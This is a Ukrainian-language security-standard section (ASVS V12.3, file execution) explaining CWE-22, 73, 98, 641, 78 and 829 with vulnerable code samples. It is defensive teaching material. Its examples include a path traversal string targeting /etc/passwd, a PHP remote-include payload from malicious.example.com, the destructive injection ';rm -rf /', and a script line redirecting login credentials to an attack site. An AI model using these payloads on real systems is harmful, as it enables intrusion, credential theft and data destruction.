# V12.3 Виконання файлу

| # | опис | L1 | L2 | L3 | CWE |
| :---: | :--- | :---: | :---: | :---: | :---: |
| **12.3.1** | Переконайтеся, що надіслані користувачем метадані назви файлів не використовуються безпосередньо системою або файловими системами фреймворку, і що API URL-адреси використовується для захисту від проходження шляху. | ✓ | ✓ | ✓ | 22 |
| **12.3.2** | Переконайтеся, що надані користувачем метадані назв файлів перевіряються або ігноруються, щоб запобігти розкриттю, створенню, оновленню чи видаленню локальних файлів (LFI). | ✓ | ✓ | ✓ | 73 |
| **12.3.3** | Переконайтеся, що надані користувачем метадані назви файлів перевіряються або ігноруються, щоб запобігти розкриттю або виконанню віддалених файлів через атаки Remote File Include (RFI) або Server-side Request Forgery (SSRF). | ✓ | ✓ | ✓ | 98 |
| **12.3.4** | Переконайтеся, що програма перевіряє або ігнорує надані користувачем імена файлів, зокрема в параметрах JSON, JSONP або URL. Заголовок Content-Type відповіді та заголовок Content-Disposition мають бути закріплені у файлі та безпечно оброблятися програмою, а не користувачем. | ✓ | ✓ | ✓ | 641 |
| **12.3.5** | Переконайтеся, що метадані ненадійного файлу не використовуються безпосередньо з системним API або бібліотеками, щоб захистити від впровадження команд ОС. | ✓ | ✓ | ✓ | 78 |
| **12.3.6** |Переконайтеся, що програма не містить і не виконує функції з ненадійних джерел, таких як неперевірені мережі розповсюдження вмісту, бібліотеки JavaScript, бібліотеки npm вузла або DLL на стороні сервера. | | ✓ | ✓ | 829 |

# CWE - 22 Неправильне обмеження імені шляху до каталогу з обмеженим доступом (обхід шляху) 

Програмне забезпечення використовує зовнішні вхідні дані для створення шляху, призначеного для ідентифікації файлу чи каталогу, розташованого під обмеженим батьківським каталогом, але програмне забезпечення не нейтралізує належним чином спеціальні елементи всередині шляху, які можуть призвести до визначення шляху до розташування, яке знаходиться поза межами обмеженого каталогу.

### опис

Багато файлових операцій призначені для виконання в обмеженому каталозі. Використовуючи спеціальні елементи, такі як роздільники «..» і «/», зловмисники можуть вийти за межі обмеженого розташування, щоб отримати доступ до файлів або каталогів, які знаходяться в інших місцях системи. Одним із найпоширеніших спеціальних елементів є послідовність «../», яка в більшості сучасних операційних систем інтерпретується як батьківський каталог поточного розташування. Це називається відносним проходженням шляху. Обхід шляху також охоплює використання абсолютних імен шляхів, таких як "/usr/local/bin", які також можуть бути корисними для доступу до неочікуваних файлів. Це називається проходженням абсолютного шляху.

У багатьох мовах програмування введення нульового байта (0 або NUL) може дозволити зловмиснику скоротити згенероване ім’я файлу, щоб розширити сферу атаки. Наприклад, програмне забезпечення може додати «.txt» до будь-якого шляху, таким чином обмежуючи зловмисника текстовими файлами, але нульове впровадження може ефективно усунути це обмеження.

### Демонстрації

Наведені нижче приклади допомагають проілюструвати природу цієї слабкості та описують методи або прийоми, які можна використовувати для зменшення ризику.

Зауважте, що наведені тут приклади аж ніяк не є вичерпними, і будь-яка слабка сторона може мати багато тонких різновидів, кожна з яких може потребувати різних методів виявлення або засобів керування під час виконання.

### приклад

Наведений нижче код може стосуватися програми соціальної мережі, у якій інформація профілю кожного користувача зберігається в окремому файлі. Усі файли зберігаються в одному каталозі.

```
my $dataPath = "/users/cwe/profiles";
my $username = param("user");
my $profilePath = $dataPath . "/" . $username;

open(my $fh, "<$profilePath") || ExitError("profile read error: $profilePath");
print "<ul>\n";
while (<$fh>) {
  print "<li>$_</li>\n";
}
print "</ul>\n";
```

Хоча програміст має намір отримати доступ до таких файлів, як «/users/cwe/profiles/alice» або «/users/cwe/profiles/bob», немає перевірки вхідного параметра користувача. Зловмисник може надати такий рядок, як:

```
../../../etc/passwd

```

Програма згенерує такий шлях до профілю:

```
/users/cwe/profiles/../../../etc/passwd
```

Коли файл відкривається, операційна система вирішує "../" під час канонізації шляху та фактично отримує доступ до цього файлу:

```
/etc/passwd
```

В результаті зловмисник міг прочитати весь текст файлу паролів.


# CWE - 73 Зовнішній контроль імені файлу або шляху

Програмне забезпечення дозволяє користувачам вводити дані для керування або впливу на шляхи чи імена файлів, які використовуються в операціях файлової системи.

### опис

Це може дозволити зловмиснику отримати доступ або змінити системні файли чи інші файли, критичні для програми.

Помилки маніпуляції шляхом виникають, коли виконуються такі дві умови:

Зловмисник може вказати шлях, який використовується в операції з файловою системою.

Вказуючи ресурс, зловмисник отримує можливість, яка інакше не була б дозволена.

Наприклад, програма може надати зловмиснику можливість перезаписати вказаний файл або запуститися з конфігурацією, контрольованою зловмисником.

### Демонстрації

Наведені нижче приклади допомагають проілюструвати природу цієї слабкості та описують методи або прийоми, які можна використовувати для зменшення ризику.

Зауважте, що наведені тут приклади аж ніяк не є вичерпними, і будь-яка слабка сторона може мати багато тонких різновидів, кожна з яких може потребувати різних методів виявлення або засобів керування під час виконання.

### приклад

У наведеному нижче коді для створення імені файлу використовуються дані HTTP-запиту. Програміст не врахував можливість того, що зловмисник міг би надати назву файлу, наприклад "../../tomcat/conf/server.xml", що змушує програму видаляти один із власних конфігураційних файлів (CWE-22). .

```
String rName = request.getParameter("reportName");
File rFile = new File("/usr/local/apfr/reports/" + rName);
...
rFile.delete();
```

# CWE - 98 Неналежний контроль імені файлу для оператора Include/Require у програмі PHP ("віддалене включення файлу PHP")

Додаток PHP отримує вхідні дані від вищестоящого компонента, але не обмежує або неправильно обмежує введення перед його використанням у функціях "require", "include" або подібних.

### опис

У деяких версіях і конфігураціях PHP це може дозволити зловмиснику вказати URL-адресу віддаленого місця, з якого програмне забезпечення отримає код для виконання. В інших випадках, пов’язаних із проходженням шляху, зловмисник може вказати локальний файл, який може містити виконувані оператори, які може аналізувати PHP.

### Демонстрації

Наведені нижче приклади допомагають проілюструвати природу цієї слабкості та описують методи або прийоми, які можна використовувати для зменшення ризику.

Зауважте, що наведені тут приклади аж ніяк не є вичерпними, і будь-яка слабка сторона може мати багато тонких різновидів, кожна з яких може потребувати різних методів виявлення або засобів керування під час виконання.

### приклад

Наступний код, žrtve.php, намагається включити функцію, що міститься на окремій сторінці PHP на сервері. Він створює шлях до файлу, використовуючи наданий параметр 'module_name' і додаючи до нього рядок '/function.php'.

```
$dir = $_GET['module_name'];
include($dir . "/function.php");
```

Проблема з наведеним вище кодом полягає в тому, що значення $dir жодним чином не обмежено, і зловмисник може маніпулювати параметром 'module_name', щоб примусово включити неочікуваний файл. Наприклад, зловмисник може надіслати запит на наведену вище PHP-сторінку (example.php) із «module_name» «http://malicious.example.com», використовуючи такий рядок запиту:

```
victim.php?module_name=http://malicious.example.com
```

Отримавши цей запит, код встановить для «module_name» значення «http://malicious.example.com» і спробує включити http://malicious.example.com/function.php разом із будь-яким шкідливим кодом. це містить.

Для цього прикладу припустимо, що шкідлива версія function.php виглядає так:

```
system($_GET['cmd']);
```

Тепер зловмисник може піти далі в нашому прикладі та надати рядок запиту таким чином:

```
victim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-l
```

Код спробує включити шкідливий файл function.php із віддаленого сайту. У свою чергу, цей файл виконує команду, зазначену в параметрі cmd із рядка запиту. Кінцевим результатом є спроба tvictim.php виконати потенційно шкідливу команду, у цьому випадку:

```
/bin/ls -l
```

Зверніть увагу, що наведений вище приклад PHP можна пом’якшити, встановивши allow_url_fopen на false, хоча це не повністю захистить код. Перегляньте потенційні пом’якшення.

# CWE - 641 Неправильне обмеження імен для файлів та інших ресурсів

Програма створює ім’я файлу чи іншого ресурсу, використовуючи вхідні дані від вищестоящого компонента, але не обмежує або неправильно обмежує результуюче ім’я.

### опис

Це може призвести до слабких місць. Наприклад, якщо імена цих ресурсів містять символи сценаріїв, можливо, що сценарій може бути виконано в браузері клієнта, якщо програма коли-небудь відобразить назву ресурсу на динамічно створеній веб-сторінці. З іншого боку, якщо ресурси споживає якийсь аналізатор програми, спеціально створене ім’я може використовувати певну вразливість усередині аналізатора, що потенційно може призвести до виконання довільного коду на сервері. Проблеми залежатимуть від контексту використання таких неправильно сформованих імен ресурсів, а також від наявності вразливостей у цільовій технології чи припущень, які роблять виконання коду можливим.

# CWE - 78 Неналежна нейтралізація спеціальних елементів, які використовуються в команді ОС («Ін’єкція команди ОС»)

Програмне забезпечення створює всю або частину команди ОС, використовуючи зовнішні вхідні дані від вищестоящого компонента, але воно не нейтралізує або неправильно нейтралізує спеціальні елементи, які можуть змінити заплановану команду ОС, коли вона надсилається нижчестоящому компоненту.

### опис

Це може дозволити зловмисникам виконувати несподівані, небезпечні команди безпосередньо в операційній системі. Ця слабкість може призвести до вразливості в середовищах, у яких зловмисник не має прямого доступу до операційної системи, наприклад у веб-додатках. З іншого боку, якщо слабкість виникає в привілейованій програмі, це може дозволити зловмиснику вказати команди, які зазвичай були б недоступні, або викликати альтернативні команди з привілеями, яких зловмисник не має. Проблема посилюється, якщо скомпрометований процес не дотримується принципу найменших привілеїв, оскільки керовані зловмисником команди можуть виконуватися зі спеціальними системними привілеями, що збільшує кількість шкоди.

Існує принаймні два підтипи впровадження команд ОС:

Додаток має намір виконувати єдину фіксовану програму, яка знаходиться під його власним контролем. Він має намір використовувати зовнішні вхідні дані як аргументи цієї програми. Наприклад, програма може використовувати system("nslookup [HOSTNAME]"), щоб запустити nslookup і дозволити користувачеві вказати HOSTNAME, яке використовується як аргумент. Зловмисники не можуть перешкодити виконанню nslookup. Однак, якщо програма не видаляє роздільники команд з аргументу HOSTNAME, зловмисники можуть розмістити роздільники в аргументах, що дозволяє їм виконувати власну програму після завершення виконання nslookup.

Програма приймає вхідні дані, які вона використовує, щоб повністю вибрати, яку програму запускати, а також які команди використовувати. Програма просто перенаправляє всю цю команду в операційну систему. Наприклад, програма може використовувати "exec([КОМАНДА])", щоб виконати [КОМАНДУ], надану користувачем. Якщо КОМАНДА знаходиться під контролем зловмисника, то зловмисник може виконувати довільні команди або програми. Якщо команда виконується за допомогою таких функцій, як exec() і CreateProcess(), зловмисник може не мати змоги об’єднати кілька команд в одному рядку.

З точки зору слабкості, ці варіанти представляють різні помилки програміста. У першому варіанті програміст явно передбачає, що вхідні дані від ненадійних сторін будуть частиною аргументів у команді, яка буде виконана. У другому варіанті програміст не має на меті, щоб команда була доступна будь-якій ненадійній стороні, але програміст, ймовірно, не врахував альтернативних способів, якими зловмисники можуть надати вхідні дані.


### Демонстрації

Наведені нижче приклади допомагають проілюструвати природу цієї слабкості та описують методи або прийоми, які можна використовувати для зменшення ризику.

Зауважте, що наведені тут приклади аж ніяк не є вичерпними, і будь-яка слабка сторона може мати багато тонких різновидів, кожна з яких може потребувати різних методів виявлення або засобів керування під час виконання.

### приклад

Цей приклад коду має на меті взяти ім’я користувача та вивести список вмісту домашнього каталогу цього користувача. Підлягає першому варіанту впровадження команди ОС.

```
$userName = $_POST["user"];
$command = 'ls -l /home/' . $userName;
system($command);
```

Змінна $userName не перевіряється на зловмисне введення. Зловмисник може встановити змінну $userName на довільну команду ОС, наприклад:

```
;rm -rf /
```

Що призведе до того, що $command буде:

```
ls -l /home/;rm -rf /
```

Оскільки крапка з комою є роздільником команд в Unix, ОС спочатку виконає команду ls, а потім команду rm, видаливши всю файлову систему.

# CWE - 829 Включення функціональності з ненадійної сфери управління

Програмне забезпечення імпортує, вимагає або включає виконувані функціональні можливості (наприклад, бібліотеку) з джерела, яке знаходиться поза передбачуваною сферою керування.

### опис

У разі включення сторонніх функціональних можливостей, таких як веб-віджет, бібліотека чи інше джерело функціональних можливостей, програмне забезпечення має ефективно довіряти цим функціональним можливостям. Без достатніх механізмів захисту ця функція може мати зловмисний характер (походити з ненадійного джерела, бути підробленим або змінюватися під час передачі з надійного джерела). Функціональність також може містити власні недоліки або надавати доступ до додаткової функціональності та інформації про стан, яка має бути закритою для базової системи, як-от інформація про стан системи, конфіденційні дані програми або DOM веб-програми.

### Демонстрації

Наведені нижче приклади допомагають проілюструвати природу цієї слабкості та описують методи або прийоми, які можна використовувати для зменшення ризику.

Зауважте, що наведені тут приклади аж ніяк не є вичерпними, і будь-яка слабка сторона може мати багато тонких різновидів, кожна з яких може потребувати різних методів виявлення або засобів керування під час виконання.

### приклад

Ця веб-сторінка входу містить віджет погоди із зовнішнього веб-сайту:

```
<div class="header"> Welcome!
  <div id="loginBox">Please Login:
    <form id ="loginForm" name="loginForm" action="login.php" method="post">
    Username: <input type="text" name="username" />
    <br/>
    Password: <input type="password" name="password" />
    <input type="submit" value="Login" />
    </form>
  </div>
  <div id="WeatherWidget">
    <script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"></script>
  </div>
</div>
```

Ця веб-сторінка тепер настільки безпечна, наскільки безпечна зовнішня доменна функція, з якої вона включає функції. Якби зловмисник скомпрометував зовнішній домен і міг додати шкідливі сценарії до файлу weatherwidget.js, зловмисник мав би повний контроль

Наприклад, інформацію про вхід користувача можна легко вкрасти за допомогою одного рядка, доданого до weatherwidget.js:

```
...Weather widget code....
document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";
```

Цей рядок JavaScript змінює початкову ціль дії форми входу з оригінального веб-сайту на сайт атаки. У результаті, якщо користувач спробує ввійти, його ім’я користувача та пароль будуть надіслані безпосередньо на сайт атаки.
